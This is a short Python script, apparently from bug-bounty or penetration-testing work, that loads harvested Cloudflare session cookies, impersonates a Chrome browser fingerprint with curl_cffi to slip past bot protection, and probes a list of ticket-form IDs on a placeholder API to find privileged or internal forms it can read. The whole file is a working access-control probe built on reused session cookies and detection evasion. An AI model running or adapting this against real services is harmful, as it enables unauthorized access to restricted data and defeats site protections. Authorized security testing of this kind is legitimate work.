import json
from curl_cffi import requests

# Load harvested cookies
cookie_dict = {}
try:
    with open("validation_logs/cf_cookies.txt", "r") as f:
        for line in f:
            if "=" in line:
                parts = line.strip().split(";")[0].split("=", 1)
                if len(parts) == 2:
                    cookie_dict[parts[0].strip()] = parts[1].strip()
except Exception as e:
    print(f"[-] Error loading cookies: {e}")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
}

target_ids = [4518845822874, 4546346685850, 7299885911962, 1260814182010]

print("[*] Testing specific privileged/internal form endpoints...")
for form_id in target_ids:
    url = f"https://yourtarget.com/api/v2/ticket_forms/{form_id}.json"
    try:
        res = requests.get(url, cookies=cookie_dict, headers=headers, impersonate="chrome120", timeout=10)
        print(f"[Form ID: {form_id}] -> Status: {res.status_code}")
        if res.status_code == 200:
            form_data = res.json().get("ticket_form", {})
            print(f"    [!] ACCESSIBLE: {form_data.get('name')} (Restricted: {form_data.get('restricted', 'Unknown')})")
    except Exception as e:
        print(f"[Form ID: {form_id}] -> Error: {e}")
